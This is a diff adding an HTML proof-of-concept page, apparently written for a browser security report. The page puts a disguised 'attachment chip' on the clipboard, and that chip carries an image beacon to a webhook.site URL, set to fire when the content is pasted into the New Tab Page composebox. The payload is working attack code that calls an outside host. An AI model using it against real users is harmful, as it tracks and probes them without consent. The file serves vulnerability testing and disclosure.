@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC - composebox paste beacon</title>
+<style>
+  body { font-family: monospace; background: #222; color: #0f0; padding: 20px; }
+  button { font-size: 18px; padding: 12px 24px; }
+  #log { white-space: pre-wrap; margin-top: 16px; }
+</style>
+</head>
+<body>
+<h3>PoC: simulates an attacker page that puts a composebox "chip" payload on the clipboard.</h3>
+<p>Click the button, then go to the NTP composebox and paste (Ctrl+V) into the input.</p>
+<button id="copyBtn">Copy malicious clipboard content</button>
+<div id="log"></div>
+
+<script>
+const log = document.getElementById('log');
+document.getElementById('copyBtn').addEventListener('click', async () => {
+  const beaconUrl = 'https://webhook.site/3808acf5-c702-4007-ba1d-c97cbf0c91ba_' + Date.now();
+  const html = `<span class="aim-chip" contenteditable="false">` +
+               `<img src="${beaconUrl}" alt="chip-icon">` +
+               `<span class="chip-label">innocent looking attachment</span>` +
+               `</span>`;
+  const plain = 'innocent looking attachment';
+
+  try {
+    const item = new ClipboardItem({
+      'text/plain': new Blob([plain], {type: 'text/plain'}),
+      'text/html': new Blob([html], {type: 'text/html'}),
+    });
+    await navigator.clipboard.write([item]);
+    log.textContent = 'Copied to clipboard.\nBeacon URL: ' + beaconUrl +
+        '\n\nNow go paste (Ctrl+V) into the NTP composebox input, then tell Claude to check the server log.';
+  } catch (e) {
+    log.textContent = 'Failed to write clipboard: ' + e;
+  }
+});
+</script>
+</body>
+</html>
